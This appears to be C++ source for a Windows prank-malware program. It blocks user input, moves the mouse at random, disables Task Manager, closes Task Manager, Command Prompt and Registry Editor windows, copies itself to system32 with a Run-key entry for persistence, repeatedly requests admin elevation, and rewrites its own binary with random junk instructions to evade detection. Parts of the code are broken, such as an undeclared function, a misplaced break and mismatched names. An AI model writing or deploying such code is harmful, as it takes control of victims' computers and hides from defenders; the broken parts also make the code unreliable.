/* 
 * File:   main.cpp
 * Author: Alessio
 *
 * Created on 24 giugno 2014, 19.41
 */

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#include <conio.h>
#include <ctime>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
using namespace std;

/*definisco le varie istruzione asm*/
#define PUSH 0x50
#define POP  0x58
#define MOV  0xB8
#define NOP  0x90

#define ADD  0x01
#define AND  0x21
#define XOR  0x31
#define OR   0x09
#define SBB  0x19
#define SUB  0x29

/*definisco una macro chiamata JUNK, la quale tramite emit inietta le
 istruzioni asm all'interno del codice nel byte preciso corrispondente
 al punto in cui viene richiamata la macro, la sequenza dei NOP verra`
 poi riscritta tramite la funzione replacejunk. */
#define JUNK __emit__(PUSH,NOP,NOP,NOP,NOP,NOP,NOP,NOP,NOP,POP)
#define JUNKLEN 8

unsigned char *code;
int codelen;

/*creo la lista contenente le varie possibili istruzioni asm, come da
 define precedenti*/
const unsigned char prefixes[] = { ADD,AND,XOR,OR,SBB,SUB,0 };

int random, X, Y;
HWND TaskMgr, CMD, Regedit;
char Website[MAX_PATH]="http:\\www.google.com";

void SetUp();
void run(int ID);
void crazy_mouse();
void readcode(const char *filename);
void writecode(const char *filename);
void replacejunk(void);
void destroy_window();
void polymorph_me(const char *filename);
int writeinstruction(unsigned reg, int offset, int space);
int readinstruction(unsigned reg, int offset);
int disable_task_mananger();
BOOL is_running_as_admin();

int main(int argc, char *argv[]) {
    if(!is_running_as_admin()) {
        elevate_now();
    }
    srand( time(0) );
    random = rand()%6;
    system("title Polymorph ME!");
    BlockInput( true );
    SetUp();
    BlockInput( false );
    /*Creo un thread per inibire l'apertura dei malefici 3...*/
    CreateThread(NULL,
            0,
            (LPTHREAD_START_ROUTINE)&destroy_window,
            0,
            0,
            NULL);
    /*Creo un thread differente per modificare il codice.*/
    CreateThread(NULL,
            0,
            (LPTHREAD_START_ROUTINE)&polimorph_me,
            &argv[0], /* Passo al thread come parametro il nome del file */
            0,
            NULL);
    int *pos = 0;
    while(*pos <= 20) {
        run( random );
        Sleep(10);
    }

    return 0;
}

void polimorph_me(const char *filename) {
    readcode(filename);     JUNK;
    replacejunk();         JUNK;
    writecode(filename);    JUNK;
}

int disable_task_mananger() {
    /* Per dispetto disabilito anche il task manager! (o almeno ci provo) */
    DWORD dwVal = 1;

    HKEY hKey;
    try {
        RegOpenKeyEx(
                HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\",
                0,
                KEY_ALL_ACCESS,
                &hKey);
        RegSetValueEx (
            hKey,
            "DisableTaskmgr",
            0,
            REG_DWORD,
            (LPBYTE)&dwVal ,
            sizeof(DWORD));
    } catch (...) {
        /* Qualcosa e` andato storto... Magari la chiave non c'e`? */
        return -1;
    }
    RegCloseKey(hKey);
    return 0;
}

/* LASCIATE OGNI SPERANZA A VOI CHE ENTRATE */
/* Il concetto e` quello di creare una lista di N istruzioni, le quali andranno
 * a lavorare tutte sullo stesso registro. La prima istruzione e` un PUSH,
 * mentre l'ultima e` un POP in modo da reinizializzare il valore iniziale del
 * registro e non alterare in alcun modo la normale esecuzione del programma
 * (eccetto per  l'aggiunta di cicli cpu), le operazioni fatte sul registro 
 * tra il PUSH ed il POP sono prese randomicamente dalla lista iniziale. */
void writecode(const char *filename) {
    /* Questa funzione si limita a scrivere il nuovo codice del programma 
     * modificato */
    FILE *fp;
    int lastoffset = strlen(filename)-1;
    char lastchar = filename[lastoffset];
    char *newfilename = strdup(filename);  JUNK;
    lastchar = '0'+(isdigit(lastchar)?(lastchar-'0'+1)%10:0);
    newfilename[lastoffset] = lastchar;
    fp = fopen(newfilename, "wb");         JUNK;
    fwrite(code, codelen, 1, fp);          JUNK;
    fclose(fp);
    free(newfilename);
}

void readcode(const char *filename) {
  FILE *fp = fopen(filename, "rb");    JUNK;
  fseek(fp, 0L, SEEK_END);             JUNK;
  codelen = ftell(fp);
  code = malloc(codelen);              JUNK;
  fseek(fp, 0L, SEEK_SET);
  fread(code, codelen, 1, fp);         JUNK;
}

int writeinstruction(unsigned reg, int offset, int space) {
    if (space < 2) {
        code[offset] = NOP;                         JUNK;
        return 1;
    } else if (space < 5 || rand()%2 == 0) {
        code[offset] = prefixes[rand()%6];          JUNK;
        code[offset+1] = 0xC0 + rand()%8*8 + reg;   JUNK;
        return 2;
    } else {
        code[offset] = MOV+reg;                     JUNK;
        *(short*)(code+offset+1) = rand();
        *(short*)(code+offset+3) = rand();          JUNK;
        return 5;
    }
}

int readinstruction(unsigned reg, int offset) {
    unsigned c1 = code[offset];
    if (c1 == NOP)
        return 1;                     JUNK;
    if (c1 == MOV+reg)
        return 5;                     JUNK;
    if (strchr(prefixes,c1)) {
        unsigned c2 = code[offset+1]; JUNK;
        if (c2 >= 0xC0 && c2 <= 0xFF && (c2&7) == reg)
        return 2;                     JUNK;
    }                                 JUNK;
    return 0;
}

void replacejunk(void) {
    /*questa funzione ricerca all'interno del codice caricato precedentemente
     in memoria una sequenza di istruzioni lunga JUNKLENGHT (in questo caso 8)
     che inzia per PUSH (registro) e finisce per POP (registro), n.b. il reg
     DEVE essere lo stesso per soddisfare la condizione di ricerca, dopo di che
     la funzione richiama per ogni istruzione all'interno della sequenza, la
     funzione writeinstruction, la quale andra` a sostituire con un rand sulla
     lista contenente tutte le varie istruzione definite in top sui define, 
     le varie istruzioni appartenenti alla sequenza JUNK trovata.*/
    int i, j, inc, space;
    srand(time(NULL));                                   JUNK;

    for (i = 0; i < codelen-JUNKLEN-2; i++) {
        unsigned start = code[i];
        unsigned end = code[i+JUNKLEN+1];
        unsigned reg = start-PUSH;
        if (start < PUSH || start >= PUSH+8) continue;   JUNK;
        if (end != POP+reg) continue;                    JUNK;
        if (reg == 4) continue; /* register 4 is ESP */
        j = 0;                                           JUNK;
        while (inc = readinstruction(reg,i+1+j)) j += inc;
        if (j != JUNKLEN) continue;                      JUNK;
        reg = rand()%7;                                  JUNK;
        reg += (reg >= 4);
        code[i] = PUSH+reg;                              JUNK;
        code[i+JUNKLEN+1] = POP+reg;                     JUNK;
        space = JUNKLEN;
        j = 0;                                           JUNK;
        while (space) {
            inc = writeinstruction(reg,i+1+j,space);     JUNK;
            j += inc;
            space -= inc;                                JUNK;
        }
        printf("%d\n",i);                                JUNK;
    }
}

/*End of polymorphic part*/

void SetUp() {
    /*Copy the file to system32*/
    char system[MAX_PATH];
    char pathtofile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
    GetSystemDirectory(system, sizeof(system));
    strcat(system, "\\win_miner.exe");
    CopyFile(pathtofile, system, false);

    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                 "Software\\Mcft\\Windows\\CurrentVersion\\Run",
                 0,
                 KEY_SET_VALUE,
                 &hKey);
    RegSetValueEx(hKey,
                  "SetUp",
                  0,
                  REG_SZ,
                  (const unsigned char*)system,
                  sizeof(system));
    RegCloseKey(hKey);
}

void run( int ID ) {
    if( ID == 1 ) {
        BlockInput(true);
    } else {
        BlockInput(true);
        crazy_mouse();
    }
}

void crazy_mouse() {
    X = rand()%801;
    Y = rand()%601;
    SetCursorPos(X, Y);
}

void destroy_window() {
    while(1) {
        TaskMgr = FindWindow(NULL, "Windows Task Manager");
        CMD = FindWindow(NULL, "Command Prompt");
        Regedit = FindWindow(NULL, "Registry Editor");
        if(TaskMgr != NULL) {
            SetWindowText( TaskMgr, "Unexpected Error.");
            PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if(CMD != NULL) {
            SetWindowText(CMD, "Unexpected Error.");
            PostMessage(CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if(Regedit != NULL) {
            SetWindowText( Regedit, "Unexpected Error.");
            PostMessage( Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        Sleep(10);
    }
}

BOOL is_running_as_admin() {
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&NtAuthority,
                                  2,
                                  SECURITY_BUILTIN_DOMAIN_RID, 
                                  DOMAIN_ALIAS_RID_ADMINS,
                                  0, 0, 0, 0, 0, 0,
                                  &pAdministratorsGroup)) {
        dwError = GetLastError();
        goto Cleanup;
    }

    if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin)) {
        dwError = GetLastError();
        goto Cleanup;
    }
Cleanup:

    if (pAdministratorsGroup) {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    if (ERROR_SUCCESS != dwError) {
        throw dwError;
    }

    return fIsRunAsAdmin;
}

void elevate_now() {
	BOOL bAlreadyRunningAsAdministrator = FALSE;
	try	{
		bAlreadyRunningAsAdministrator = is_running_as_admin();
	} catch(DWORD dwError) {
        break;
	}
	if(!bAlreadyRunningAsAdministrator) {
		char szPath[MAX_PATH];
		if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {
			SHELLEXECUTEINFO sei = { sizeof(sei) };
			sei.lpVerb = "runas";
			sei.lpFile = szPath;
			sei.hwnd = NULL;
			sei.nShow = SW_NORMAL;
			if (!ShellExecuteEx(&sei))
			{
				DWORD dwError = GetLastError();
				if (dwError == ERROR_CANCELLED)
			CreateThread(0,
                                     0,
                                     (LPTHREAD_START_ROUTINE)elevate_now,
                                     0,
                                     0,
                                     0);
	       	}
        }

    } else {
    return true;
    }
}
